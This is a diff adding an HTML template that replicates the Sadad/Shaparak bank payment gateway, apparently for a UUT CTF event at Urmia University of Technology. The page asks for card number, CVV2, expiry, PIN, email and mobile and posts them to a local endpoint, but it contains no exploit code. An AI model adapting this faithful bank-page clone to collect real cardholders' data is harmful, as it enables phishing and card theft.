@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa-IR" data-useragent="Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
+      data-platform="Linux x86_64" xmlns:th="http://www.thymeleaf.org" xmlns:sec="http://www.thymeleaf.org/thymeleaf-extras-springsecurity5">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+    <title>درگاه پرداخت شرکت پرداخت الکترونیک سداد</title>
+    <link rel="icon" type="images/x-icon" href="paysadad_files/sadad-logo.svg">
+    <meta name="description" content="درگاه پرداخت بانک ملی">
+
+    <link href="paysadad_files/bootstrap-rtl.css" rel="stylesheet">
+    <link href="paysadad_files/bootstrap-grid.rtl.css" rel="stylesheet">
+
+
+    <link href="paysadad_files/css.css" rel="stylesheet">
+
+    <link href="paysadad_files/css_002.css" rel="stylesheet">
+
+    <link href="paysadad_files/css_003.css" rel="stylesheet">
+
+
+    <script src="paysadad_files/StartUp.js"></script>
+
+    <script src="paysadad_files/jquery.js"></script>
+
+    <script src="paysadad_files/jqueryui.js"></script>
+
+    <script src="paysadad_files/jqueryval.js"></script>
+
+    <script src="paysadad_files/JsBundle_003.js"></script>
+
+    <script src="paysadad_files/JsBundle.js"></script>
+
+    <script src="paysadad_files/JsBundle_002.js"></script>
+
+    <!--[if lt IE 10]>
+    <link href="/Content/ie9.css" rel="stylesheet"><![endif]-->
+    <!--[if lt IE 9]>
+    <link href="/Content/ie8.css" rel="stylesheet"><![endif]-->
+
+
+</head>
+<body class="rtl">
+
+
+<div class="container">
+    <div class="marginTop6">
+        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">
+            <img src="paysadad_files/sadad-logo.svg" alt="sadad shaparak" class="sadad-logo">
+
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6 keypos">
+            <div class="o-box-t d-md-none d-block" style="display: none;">
+                <h3>به شادی بپردازید</h3>
+            </div>
+
+            <div id="notification-holder" style="display: none;">
+                <div id="notification">
+                </div>
+
+            </div>
+            <div id="autoAlert" class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog"
+                 aria-labelledby="myLargeModalLabel">
+                <div class="auto-alert modal-dialog modal-lg">
+                    <div class="auto-alert-content modal-content">
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">
+            <img class="toplogo" src="paysadad_files/shaparak.png" alt="logo shaparak">
+        </div>
+    </div>
+    <div class="col-12 col-md-12 col-sm-12 col-xs-12 d-block d-md-none">
+
+        <div>
+            <div class="row top-back-img">
+                <div class="top-box-mob-y2 col-lg-6 col-md-6 col-sm-6 col-xs-6">
+                    <div class="price-box">
+                        <p class="p-title">مبلغ قابل پرداخت</p>
+                        <p class="numbers-font" th:text="${amount}"></p>
+
+                    </div>
+                </div>
+                <div class="top-box-mob-y col-lg-6 col-md-6 col-sm-6 col-xs-6">
+                    <p>زمان باقیمانده</p>
+                    <div class="mobile-downt-box">
+                        <span class="newtimer numbers-font"><span class="count-digit2">1</span><span
+                                class="count-digit2">4</span><span class="separator">:</span><span class="count-digit2">1</span><span
+                                class="count-digit2">4</span></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    <div class="col-12 col-md-12 col-sm-12 col-xs-12">
+        <div class="d-block d-lg-none keypos">
+
+            <div id="mob-notification-holder">
+                <div id="mob-notification">
+                </div>
+
+            </div>
+            <div id="autoAlert2" class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog"
+                 aria-labelledby="myLargeModalLabel">
+                <div class="auto-alert modal-dialog modal-lg">
+                    <div class="auto-alert-content modal-content">
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="sideBox">
+
+
+        <script type="text/javascript">
+
+            $.getScript("/KeyPad/InitKeyPad");
+
+            function ClearText(spn) {
+                var CurrentFocusedControl = getCurrentFocusedControl();
+                if (CurrentFocusedControl == null) return;
+                var AttrFormated = CurrentFocusedControl.attributes['Formated'];
+
+                if (AttrFormated == null)
+                    CurrentFocusedControl.value = CurrentFocusedControl.value.substr(0, CurrentFocusedControl.value.length - 1);
+                else
+                    CurrentFocusedControl.value = AmountMaskE2(CurrentFocusedControl.value.substr(0, CurrentFocusedControl.value.length - 1));
+            }
+        </script>
+
+
+        <div id="padarea" align="center" style="width: 110px; margin: 0px auto; display: none;"
+             class="autocomplete-keypad">
+            <table border="0" cellpadding="1" cellspacing="1" style="width: 110px; overflow: hidden">
+                <tbody>
+                <tr>
+                    <td>
+                        <span id="spnSeven0" class="keypadicon" style="background-position: -60px -60px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven1" class="keypadicon" style="background-position: -60px 0px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven2" class="keypadicon" style="background-position: -60px -30px;"></span>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <span id="spnSeven3" class="keypadicon" style="background-position: 0px 0px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven4" class="keypadicon" style="background-position: -30px -30px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven5" class="keypadicon" style="background-position: 0px -60px;"></span>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <span id="spnSeven6" class="keypadicon" style="background-position: -30px 0px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven7" class="keypadicon" style="background-position: -30px -90px;"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven8" class="keypadicon" style="background-position: -30px -60px;"></span>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <span class="keypad_Clear" onclick="javascript:ClearText();"></span>
+                    </td>
+                    <td>
+                        <span id="spnSeven9" class="keypadicon" style="background-position: 0px -30px;"></span>
+                    </td>
+                    <td>
+                        <span class="keypad-approve" onclick="javascript:handleKeyPad()"></span>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="col-12 col-md-12 col-sm-12 col-xs-12">
+
+    </div>
+    <div class="cardDiv">
+        <div class="col-lg-3 col-md-3col-sm-3 col-xs-3  d-none d-lg-block" id="RightSideBox">
+
+            <div class="o-box o-box-f right-box-min-height">
+                <div class="card-box-f ">
+                    <span class="right-slideraro" onclick="plusSlides(1)"><img class="right-s-logo"
+                                                                               src="paysadad_files/right-arrow.png"></span>
+                    <div id="slideshow-container" class="slideshow-container">
+                        <div class="mySlides fade nocard">
+                            <img class="cart" src="paysadad_files/default.png" alt="cart shaparak">
+                            <div class="card-num"></div>
+                        </div>
+                    </div>
+                    <span class="left-slideraro" onclick="plusSlides(-1)"><img class="left-s-logo"
+                                                                               src="paysadad_files/left-arrow.png"></span>
+                </div>
+                <hr>
+                <h2 class="h2title">راهنمای استفاده از رمز پویا </h2>
+                <ul class="otp-info-ul">
+                    <li>رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده می شود</li>
+                    <li>مرحله اول: براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا اقدام نمایید
+                    </li>
+                    <li>
+                        مرحله دوم: رمز پویا را براساس روش اعلامی از طرف بانک صادرکننده کارت، به یکی از روش های زیر
+                        دریافت کنید
+                        <ol>
+                            <li>دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک</li>
+                            <li>دریافت از طریق کد USSD بانک صادرکننده کارت شما</li>
+                            <li>دریافت از طریق زدن دکمه ی "دریافت رمز دوم" در درگاه پرداخت اینترنتی</li>
+                        </ol>
+                    </li>
+                    <li>مرحله سوم: پس از دریافت رمز به یکی از روشهای فوق،
+                        رمز پویای دریافت شده را در محل تعیین شده برای "رمز اینترنتی" وارد نمایید
+                        و سپس مابقی اطلاعات را تکمیل نمایید
+                    </li>
+                </ul>
+            </div>
+
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-8 col-xs-12" id="mainBox">
+
+            <input data-val="true" data-val-required="The AddLogClientEvent field is required." id="AddLogClientEvent"
+                   name="AddLogClientEvent" type="hidden" value="False">
+
+
+            <form action="/payment" method="post">
+                <div class="o-box inline-table full-width">
+                    <input th:value="${amount}" name="Amount" type="hidden"
+                           value="">
+                    <input th:value="${orderId}" name="Order" type="hidden"
+                           value="">
+                    <input th:value="${enc}" name="Enc" type="hidden"
+                           value="">
+                    <div id="card">
+                        <div class="front">
+                            <div id="paymentInput" class="payment-container" style="z-index: 0;">
+                                <div class="payment-info-container">
+                                    <div class="CleraDiv"></div>
+                                    <div id="cardNoRow" class="inlineBlock">
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 lbl-div">
+                                            <label class="pay-label ">شماره کارت</label>
+                                        </div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 keypos no-padding-side">
+                                            <div class="col-md-12 no-padding-side">
+                                                <div class="cardnumberbox opensugestion card-input-container"
+                                                     id="cardnumberbox">
+                                                    <span class="banklogo" id="bankLogo"><img></span>
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid"
+                                                              data-valmsg-for="CardNoPart4"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" autofocus="autofocus"
+                                                            class="cardn-box numbers-font ex-input" data-ex="True"
+                                                            data-max="4" data-val="true" data-val-length=" "
+                                                            data-val-length-max="4" data-val-length-min="4"
+                                                            data-val-required=" " id="CardNoPart4" maxlength="4"
+                                                            name="CardNoPart4" onfocus="setCurrentFocusedControl(this);"
+                                                            placeholder="" tabindex="4" type="tel">
+                                                    </div>
+                                                    <b>-</b>
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid"
+                                                              data-valmsg-for="CardNoPart3"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" class="cardn-box numbers-font ex-input"
+                                                            data-ex="True" data-max="4" data-val="true"
+                                                            data-val-length=" " data-val-length-max="4"
+                                                            data-val-length-min="4" data-val-required=" "
+                                                            id="CardNoPart3" maxlength="4" name="CardNoPart3"
+                                                            onfocus="setCurrentFocusedControl(this);" placeholder=""
+                                                            tabindex="3" type="tel">
+                                                    </div>
+                                                    <b>-</b>
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid"
+                                                              data-valmsg-for="CardNoPart2"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" class="cardn-box numbers-font ex-input"
+                                                            data-ex="True" data-max="4" data-val="true"
+                                                            data-val-length=" " data-val-length-max="4"
+                                                            data-val-length-min="4" data-val-required=" "
+                                                            id="CardNoPart2" maxlength="4" name="CardNoPart2"
+                                                            onfocus="setCurrentFocusedControl(this);" placeholder=""
+                                                            tabindex="2" type="tel">
+                                                    </div>
+                                                    <b>-</b>
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid"
+                                                              data-valmsg-for="CardNoPart1"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" class="cardn-box numbers-font ex-input"
+                                                            data-ex="True" data-max="4" data-val="true"
+                                                            data-val-length=" " data-val-length-max="4"
+                                                            data-val-length-min="4" data-val-required=" "
+                                                            id="CardNoPart1" maxlength="4" name="CardNoPart1"
+                                                            onfocus="setCurrentFocusedControl(this);" placeholder=""
+                                                            tabindex="1" type="tel">
+                                                    </div>
+                                                    <span class="tikcard"><img src="paysadad_files/tik.svg"
+                                                                               alt="tik logo"></span>
+                                                    <span class="errcard"><img src="paysadad_files/tik.svg"
+                                                                               alt="error logo"></span>
+                                                </div>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12"></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 custom-col12">
+                                            <div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 cvv2-responsive-lable-div lbl-div">
+                                            <label class="pay-label">کد CVV2</label></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 cvv-input-col ">
+                                            <div class="col-lg-8 col-md-10 col-sm-10 col-xs-8 cvv-input-col">
+                                                <div class="keypos">
+
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid" data-valmsg-for="Cvv2"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" data-ex="True" data-max="4"
+                                                            data-val="true" data-val-length=" " data-val-length-max="4"
+                                                            data-val-length-min="3" data-val-required=" " id="Cvv2"
+                                                            maxlength="4" name="Cvv2"
+                                                            onfocus="setCurrentFocusedControl(this);" placeholder=""
+                                                            tabindex="5" type="tel" class="ex-input">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 lbl-div"><label
+                                                class="pay-label">تاریخ انقضا</label></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 no-padding-side expire-date-section">
+                                            <div class="col-6 col-lg-4 col-md-5 col-sm-5 col-xs-4 no-padding-right">
+                                                <div class="input-container">
+                                                    <span class="field-validation-valid" data-valmsg-for="Month"
+                                                          data-valmsg-replace="true"></span><input autocomplete="off"
+                                                                                                   class="input-min-height numbers-font ex-input"
+                                                                                                   data-ex="True"
+                                                                                                   data-max="2"
+                                                                                                   data-val="true"
+                                                                                                   data-val-length=" "
+                                                                                                   data-val-length-max="2"
+                                                                                                   data-val-length-min="2"
+                                                                                                   data-val-range=" "
+                                                                                                   data-val-range-max="12"
+                                                                                                   data-val-range-min="1"
+                                                                                                   data-val-required=" "
+                                                                                                   id="Month"
+                                                                                                   maxlength="2"
+                                                                                                   name="Month"
+                                                                                                   onfocus="setCurrentFocusedControl(this);"
+                                                                                                   placeholder="ماه"
+                                                                                                   tabindex="6"
+                                                                                                   type="tel">
+                                                </div>
+                                            </div>
+                                            <div class="col-6 col-lg-4 col-md-5 col-sm-5 col-xs-4 no-padding-right">
+                                                <div class="input-container">
+                                                    <span class="field-validation-valid" data-valmsg-for="Year"
+                                                          data-valmsg-replace="true"></span><input autocomplete="off"
+                                                                                                   class="input-min-height numbers-font ex-input"
+                                                                                                   data-ex="True"
+                                                                                                   data-max="2"
+                                                                                                   data-val="true"
+                                                                                                   data-val-length=" "
+                                                                                                   data-val-length-max="2"
+                                                                                                   data-val-length-min="2"
+                                                                                                   data-val-required=" "
+                                                                                                   id="Year"
+                                                                                                   maxlength="2"
+                                                                                                   name="Year"
+                                                                                                   onfocus="setCurrentFocusedControl(this);"
+                                                                                                   placeholder="سال"
+                                                                                                   tabindex="7"
+                                                                                                   type="tel">
+                                                </div>
+                                            </div>
+                                            <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12" id="expireDateDesc"></div>
+                                        </div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12"></div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div class="no-padding-right">
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 lbl-div"><label
+                                                class="pay-label">رمز اینترنتی</label></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 no-padding-side">
+                                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-7 pin-input-col">
+                                                <div class="keypos">
+                                                    <div class="input-container">
+                                                        <span class="field-validation-valid" data-valmsg-for="Pin"
+                                                              data-valmsg-replace="true"></span><input
+                                                            autocomplete="off" data-ex="True" data-max="12"
+                                                            data-val="true" data-val-length=" " data-val-length-max="12"
+                                                            data-val-length-min="5" data-val-required=" " id="Pin"
+                                                            maxlength="12" name="Pin"
+                                                            onfocus="setCurrentFocusedControl(this);" placeholder=""
+                                                            tabindex="9" type="tel" class="ex-input">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 lbl-div"><label
+                                                class="pay-label">ایمیل</label></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 no-padding-side">
+                                            <div class="input-container">
+                                                <span class="field-validation-valid" data-valmsg-for="EmailAddress"
+                                                      data-valmsg-replace="true"></span><input autocomplete="off"
+                                                                                               class="input-min-height"
+                                                                                               data-max="100"
+                                                                                               data-val="true"
+                                                                                               data-val-email=" "
+                                                                                               id="EmailAddress"
+                                                                                               maxlength="100"
+                                                                                               name="EmailAddress"
+                                                                                               onfocus="setCurrentFocusedControl(this);"
+                                                                                               placeholder="اختیاری"
+                                                                                               tabindex="10"
+                                                                                               type="text">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 lbl-div"><label
+                                                class="pay-label">شماره همراه</label></div>
+                                        <div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 no-padding-side">
+                                            <div class="input-container">
+                                                <span class="field-validation-valid" data-valmsg-for="MobileNo"
+                                                      data-valmsg-replace="true"></span><input autocomplete="off"
+                                                                                               class="input-min-height numbers-font"
+                                                                                               data-max="11"
+                                                                                               data-val="true"
+                                                                                               data-val-regex="موبایل وارد شده صحیح نمی باشد"
+                                                                                               data-val-regex-pattern="^09[0-9]{2}[0-9]{7}$"
+                                                                                               id="MobileNo"
+                                                                                               maxlength="11"
+                                                                                               name="MobileNo"
+                                                                                               onfocus="setCurrentFocusedControl(this);"
+                                                                                               placeholder="09********* (اختیاری)"
+                                                                                               tabindex="11" type="tel">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="CleraDiv"></div>
+                                    <div>
+                                        <div class="col-lg-3 col-md-3 col-sm-3 mobile-pay-2"></div>
+                                        <div class="col-lg-6 col-md-6 col-sm-5 col-xs-6 pay-btn  no-padding-right">
+                                            <input type="submit" value="پرداخت"
+                                                   class="btn payment-btn pay-payment captcha-stop">
+                                        </div>
+                                        <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6 cancel-btn no-padding-side">
+                                            <input type="button" id="cancelPayment" value="انصراف"
+                                                   class="btn canel-btn can-payment">
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+
+
+                        </div>
+                        <div class="back">
+                            <div id="cancelPage" class="danger-box payment-container" style="z-index: 0;">
+
+                                <img class="danger-logo" src="paysadad_files/danger.svg">
+                                <div class="row" style="text-align:center">
+                                    <div class="col-sm-12" id="cancle-message">
+
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-sm-12" style="text-align:center;padding-bottom:30px;">
+                                        <input type="button" class="btn payment-btn orange-form-control"
+                                               value="بازگشت ">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+
+
+        </div>
+        <div class="col-lg-3 col-md-3 col-sm-4 col-xs-12" id="LeftSideBox">
+
+            <div class="o-box o-box-y p-off-margin leftSide-minheight no-padding-side">
+                <div class="top-box-y d-none d-md-block">
+                    <h2>به شادی بپردازید</h2>
+                    <p class="p-force-margin-time">زمان باقیمانده</p>
+                    <div class="downt-box">
+                        <span class="newtimer"><span class="count-digit2">1</span><span
+                                class="count-digit2">4</span><span class="separator">:</span><span class="count-digit2">1</span><span
+                                class="count-digit2">4</span></span>
+                    </div>
+                </div>
+                <div class="white-info">
+                    <div class="price-box d-none d-md-block">
+                        <p>مبلغ قابل پرداخت</p>
+                        <h2 class="p-force-margin-amout" th:text="${amount}">1,000,000</h2>
+                        <p>ریال</p>
+                        <input id="Amount" name="Amount" type="hidden" value="1000000">
+                    </div>
+                    <div alt="" class="profilePic"
+                         style="background:url(../Images/default.png) no-repeat center;background-size: cover;border-image-width:0;padding:0px;overflow:hidden;outline: none;border-style: none;display: inline-block;margin:2px;"></div>
+
+                    <div class="o-det-box row">
+                        <div class="col-md-12 left-info-box">
+                            <table class="left-table">
+                                <tbody>
+                                <tr>
+                                    <td class="cov1">نام فروشگاه</td>
+                                    <td class="cov2"> UUT CTF دانشگاه صنعتی ارومیه</td>
+                                </tr>
+                                <tr>
+                                    <td class="cov1">شماره پذیرنده</td>
+                                    <td class="cov2 numbers-font" th:text="${orderId}"></td>
+                                </tr>
+                                <tr>
+                                    <td class="cov1">شماره ترمینال</td>
+                                    <td class="cov2 numbers-font">uutctf</td>
+                                    <input id="OrderId" name="OrderId" type="hidden" value="160757"
+                                           th:value="${orderId}">
+                                </tr>
+                                <tr>
+                                    <td class="cov1">آدرس سایت</td>
+                                    <td class="cov2">ctf.uut.ac.ir</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                </div>
+                <div class="d-none d-md-block">
+                    <div class="row cli-box">
+                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 support-number">خدمات مشتریان</div>
+                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 numbers-font">42739000 - 021</div>
+                    </div>
+                    <div class="clr"></div>
+                </div>
+            </div>
+
+
+        </div>
+    </div>
+    <div class="o-box footer-description">
+        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+            <h2 class="h2title" style="text-align:center">راهنمای درگاه پرداخت</h2>
+            <ul>
+                <li> درگاه پـرداخـت اینتـرنتـی سداد با اســتـفـاده
+                    از پروتکل امـــن SSL به مشـتـریان خـــود ارایــه خــدمت نــمــوده و با
+                    آدرس https://sadad.shaparak.ir شروع می‌شود
+                </li>
+                <li>خواهشمند است به منظور جلوگیـری از سـوء
+                    استفاده‌های احتـمالی پیـش از ورود هـرگونه اطلاعات، آدرس مـوجود در بـخش
+                    مرورگر وب خـود را با آدرس فـوق مقایسـه نـمایـید و درصورت مشاهـده هر نـوع
+                    مغـایرت احتمـالی، مـوضـوع را بـا ما درمیان بگذارید
+                </li>
+                <li>از صحت نـام فـروشنـده و مبـلغ نـمایش داده شـده، اطمینان حاصل فرمایید</li>
+                <li>برای جلوگیـری از افـشـای رمـز کـارت خـود، از صـفـحـه کـلـیـد مجازی استفـاده فرمایید</li>
+                <li>برای کسـب اطلاعات بیشتـر، گزارش فروشگـاه‌های
+                    مشکـوک و همچنین اطـلاع از وضـعیـت پذیرنـدگان اینترنتی با شـمـاره
+                    42739000 تمـاس بگیــریـد و یـا از طـریـق ایـمـیـل callcenter@sadadpsp.ir
+                    اقدام نمایید
+                </li>
+            </ul>
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12" style="text-align:justify">
+            <h2 class="h2title" style="text-align:center">نحوه ورود اطلاعات</h2>
+            <div class="o-dec-box">
+
+                <table class="bottom-table">
+                    <tbody>
+                    <tr>
+                        <td class="cob1">شماره کارت:</td>
+                        <td class="cob2">۱۶ رقمی بوده و بصورت ۴ قسمت ۴ رقمی و روی کارت درج شده است.</td>
+                    </tr>
+                    <tr>
+                        <td class="cob1">CVV2:</td>
+                        <td class="cob2 iransans">با طول ۳ یا ۴ رقـم کنـار شمـاره‌کارت و یـا پـشت کارت درج شده است.</td>
+                    </tr>
+                    <tr>
+                        <td class="cob1">تاریخ انقضا:</td>
+                        <td class="cob2 iransans">شامل دو بخش مـاه و سـال انقضا در کنـار شـماره کارت درج شده است.</td>
+                    </tr>
+                    <tr>
+                        <td class="cob1">رمز اینترنتی:</td>
+                        <td class="cob2" style="text-align:justify">
+                            بـا عــنـوان رمــــز دوم و در بــرخــی مــوارد با عنوان Pin2 شنـاختـه
+                            مـیشــود، از طـــریـق بــانک صــادر کنـنـده کـارت تــولــیـد شــده و
+                            هـمـچنـیـن از طــریــق دستگاه های خودپرداز بانـک صـادر کـننده قابل تهیه و
+                            یا تغییر میباشـد.
+                        </td>
+                    </tr>
+                    </tbody>
+                </table>
+
+
+            </div>
+        </div>
+        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+            <div class="d-block d-lg-none dynamic-info-Txt">
+                <h2 class="h2title">راهنمای استفاده از رمز پویا </h2>
+                <ul>
+                    <li>رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده می شود</li>
+                    <li>مرحله اول: براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا اقدام نمایید
+                    </li>
+                    <li>
+                        مرحله دوم: رمز پویا را براساس روش اعلامی از
+                        طرف بانک صادرکننده کارت، به یکی از روش های زیر دریافت کنید
+                        <ol>
+                            <li>دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک</li>
+                            <li>دریافت از طریق کد USSD بانک صادرکننده کارت شما</li>
+                            <li>دریافت از طریق زدن دکمه ی "دریافت رمز دوم" در درگاه پرداخت اینترنتی</li>
+                        </ol>
+                    </li>
+                    <li>مرحله سوم: پس از دریافت رمز به یکی از روشهای
+                        فوق، رمز پویای دریافت شده را در محل تعیین شده برای "رمز اینترنتی" وارد
+                        نمایید و سپس مابقی اطلاعات را تکمیل نمایید
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+        <div class="bottom-call d-block d-md-none">
+            <hr>
+            <div class="row">
+                <div class="col-6 col-md-6">خدمات مشتریان</div>
+                <div class="col-6 col-md-6 numbers-font">42739000 - 021</div>
+            </div>
+        </div>
+    </div>
+</div>
+<br><br>
+
+<script src="paysadad_files/PaymentBundle.js"></script>
+
+<script src="paysadad_files/jsencrypt.min.js"></script>
+
+
+</body>
+</html>
